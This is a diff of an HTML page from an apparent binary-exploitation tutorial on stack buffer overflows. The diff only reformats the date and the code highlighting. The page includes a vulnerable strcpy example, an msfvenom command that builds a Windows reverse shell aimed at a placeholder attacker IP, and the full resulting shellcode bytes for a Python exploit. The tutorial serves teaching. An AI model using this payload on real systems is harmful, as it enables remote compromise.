@@ -115,7 +115,7 @@
       
     <h1 id="binexp-corner-1-bofs">BinExp Corner: Episode 1 - Stack Buffer Overflows</h1>
     <p>
-      Posted on sáb 06 março 2021 in <a href="/category/tutorials.html">Tutorials</a>
+      Posted on Sat 06 March 2021 in <a href="/category/tutorials.html">Tutorials</a>
 
     </p>
   </header>
@@ -145,15 +145,15 @@
 </blockquote>
 <p>Each function in a program is given its own separate stack frame, to store local variables, arguments passed to the function etc. Each new stack frame is allocated when a function is called and deallocated when the function returns. </p>
 <p>Time for an example, let's take a look at a program based on this (admittedly ridiculous) piece of code:</p>
-<div class="highlight"><pre><span></span><code><span class="n">main</span><span class="p">(){</span>
-    <span class="kt">int</span> <span class="n">num1</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">num2</span><span class="p">;</span>
-    <span class="n">func</span><span class="p">();</span>
-<span class="p">}</span>
-<span class="n">func</span><span class="p">(){</span>
-    <span class="kt">int</span> <span class="n">num3</span><span class="p">;</span>
-    <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
+<div class="highlight"><pre><span></span><code><span class="n">main</span><span class="p">(){</span><span class="w"></span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">num1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">num2</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">func</span><span class="p">();</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+<span class="n">func</span><span class="p">(){</span><span class="w"></span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">num3</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
 </code></pre></div>
 
 <p>So what happens here?</p>
@@ -176,14 +176,14 @@
 <p>So, how do we use this to our advantage?</p>
 <h2>The Stack Buffer Overflow</h2>
 <p>Take the following code:</p>
-<div class="highlight"><pre><span></span><code><span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
-    <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-<span class="p">}</span> 
-<span class="kt">void</span> <span class="n">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span> 
-    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
-    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
-    <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
+<div class="highlight"><pre><span></span><code><span class="n">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
+<span class="p">}</span><span class="w"> </span>
+<span class="kt">void</span><span class="w"> </span><span class="n">func</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
 </code></pre></div>
 
 <p>Here, 2 interesting things happen:</p>
@@ -372,30 +372,30 @@ Trust your debugger.</p>
 <p><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;Attacker-IP-ADDRESS&gt; LPORT=4444 EXITFUNC=thread -b "\x00\xa0\xcd\xd4" -a x86 -f c</code></p>
 <p>This generates code for a windows reverse shell, pointed at our attack machine, on port 4444, for x86 architecture and we ask for it in c because it gives us something that'll be really easy to convert to our python exploit.</p>
 <p>We copy this part to our exploit:</p>
-<div class="highlight"><pre><span></span><code><span class="s">&quot;</span><span class="se">\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x10\xff\xf0\x86\x99\x1a\xc1\x86\xf1\x6f\x72\x37\x74\x3d\x7f</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\xbc\xd8\xd5\xf4\xb0\xf4\xda\xbd\x7f\x23\xd5\x3e\xd3\x17\x74</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\xbd\x2e\x44\x56\xfc\xe0\x99\x97\x39\x1c\x53\xc5\x92\x6a\xc6</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\xf9\x97\x27\xdb\x72\xeb\xa6\x5b\x67\xbc\xc9\x4a\x36\xb6\x93</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x4c\xb9\x1b\xa8\xc4\xa1\x78\x95\x9f\x5a\x4a\x61\x1e\x8a\x82</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x8a\x8d\xf3\x2a\x79\xcf\x34\x8c\x62\xba\x4c\xee\x1f\xbd\x8b</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x8c\xfb\x48\x0f\x36\x8f\xeb\xeb\xc6\x5c\x6d\x78\xc4\x29\xf9</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x26\xc9\xac\x2e\x5d\xf5\x25\xd1\xb1\x7f\x7d\xf6\x15\xdb\x25</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x97\x0c\x81\x88\xa8\x4e\x6a\x74\x0e\x05\x87\x61\x3c\x44\xc0</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x46\x0d\x76\x10\xc1\x06\x05\x22\x4e\xbd\x81\x0e\x07\x1b\x56</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x70\x32\xdb\xc8\x8f\xbd\x1c\xc1\x4b\xe9\x4c\x79\x7d\x92\x06</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x79\x82\x47\x88\x29\x2c\x38\x67\x99\x8c\xe8\x01\xf3\x02\xd6</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x32\xfc\xc8\x7f\xd8\x07\x9b\x75\x15\x65\xe6\xe2\x27\x69\x09</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\xaf\xae\x8f\x43\x5f\xe7\x18\xfc\xc6\xa2\xd2\x9d\x07\x79\x9f</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x9e\x8c\x8e\x60\x50\x65\xfa\x72\x05\x85\xb1\x28\x80\x9a\x6f</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x44\x4e\x08\xf4\x94\x19\x31\xa3\xc3\x4e\x87\xba\x81\x62\xbe</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x14\xb7\x7e\x26\x5e\x73\xa5\x9b\x61\x7a\x28\xa7\x45\x6c\xf4</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x28\xc2\xd8\xa8\x7e\x9c\xb6\x0e\x29\x6e\x60\xd9\x86\x38\xe4</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x9c\xe4\xfa\x72\xa1\x20\x8d\x9a\x10\x9d\xc8\xa5\x9d\x49\xdd</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\xde\xc3\xe9\x22\x35\x40\x09\xc1\x9f\xbd\xa2\x5c\x4a\x7c\xaf</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\x5e\xa1\x43\xd6\xdc\x43\x3c\x2d\xfc\x26\x39\x69\xba\xdb\x33</span><span class="s">&quot;</span>
-<span class="s">&quot;</span><span class="se">\xe2\x2f\xdb\xe0\x03\x7a</span><span class="s">&quot;</span>
+<div class="highlight"><pre><span></span><code><span class="s">&quot;</span><span class="se">\xb8\xbd\xf9\x81\x1a\xdb\xd9\xd9\x74\x24\xf4\x5e\x29\xc9\xb1</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x52\x83\xee\xfc\x31\x46\x0e\x03\xfb\xf7\x63\xef\xff\xe0\xe6</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x10\xff\xf0\x86\x99\x1a\xc1\x86\xf1\x6f\x72\x37\x74\x3d\x7f</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\xbc\xd8\xd5\xf4\xb0\xf4\xda\xbd\x7f\x23\xd5\x3e\xd3\x17\x74</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\xbd\x2e\x44\x56\xfc\xe0\x99\x97\x39\x1c\x53\xc5\x92\x6a\xc6</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\xf9\x97\x27\xdb\x72\xeb\xa6\x5b\x67\xbc\xc9\x4a\x36\xb6\x93</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x4c\xb9\x1b\xa8\xc4\xa1\x78\x95\x9f\x5a\x4a\x61\x1e\x8a\x82</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x8a\x8d\xf3\x2a\x79\xcf\x34\x8c\x62\xba\x4c\xee\x1f\xbd\x8b</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x8c\xfb\x48\x0f\x36\x8f\xeb\xeb\xc6\x5c\x6d\x78\xc4\x29\xf9</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x26\xc9\xac\x2e\x5d\xf5\x25\xd1\xb1\x7f\x7d\xf6\x15\xdb\x25</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x97\x0c\x81\x88\xa8\x4e\x6a\x74\x0e\x05\x87\x61\x3c\x44\xc0</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x46\x0d\x76\x10\xc1\x06\x05\x22\x4e\xbd\x81\x0e\x07\x1b\x56</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x70\x32\xdb\xc8\x8f\xbd\x1c\xc1\x4b\xe9\x4c\x79\x7d\x92\x06</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x79\x82\x47\x88\x29\x2c\x38\x67\x99\x8c\xe8\x01\xf3\x02\xd6</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x32\xfc\xc8\x7f\xd8\x07\x9b\x75\x15\x65\xe6\xe2\x27\x69\x09</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\xaf\xae\x8f\x43\x5f\xe7\x18\xfc\xc6\xa2\xd2\x9d\x07\x79\x9f</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x9e\x8c\x8e\x60\x50\x65\xfa\x72\x05\x85\xb1\x28\x80\x9a\x6f</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x44\x4e\x08\xf4\x94\x19\x31\xa3\xc3\x4e\x87\xba\x81\x62\xbe</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x14\xb7\x7e\x26\x5e\x73\xa5\x9b\x61\x7a\x28\xa7\x45\x6c\xf4</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x28\xc2\xd8\xa8\x7e\x9c\xb6\x0e\x29\x6e\x60\xd9\x86\x38\xe4</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x9c\xe4\xfa\x72\xa1\x20\x8d\x9a\x10\x9d\xc8\xa5\x9d\x49\xdd</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\xde\xc3\xe9\x22\x35\x40\x09\xc1\x9f\xbd\xa2\x5c\x4a\x7c\xaf</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\x5e\xa1\x43\xd6\xdc\x43\x3c\x2d\xfc\x26\x39\x69\xba\xdb\x33</span><span class="s">&quot;</span><span class="w"></span>
+<span class="s">&quot;</span><span class="se">\xe2\x2f\xdb\xe0\x03\x7a</span><span class="s">&quot;</span><span class="w"></span>
 </code></pre></div>
 
 <p>We will append this at the end of our payload. Now we're still missing one final piece of the puzzle. If our payload misses the ESP pointer by one byte it wont execute.</p>
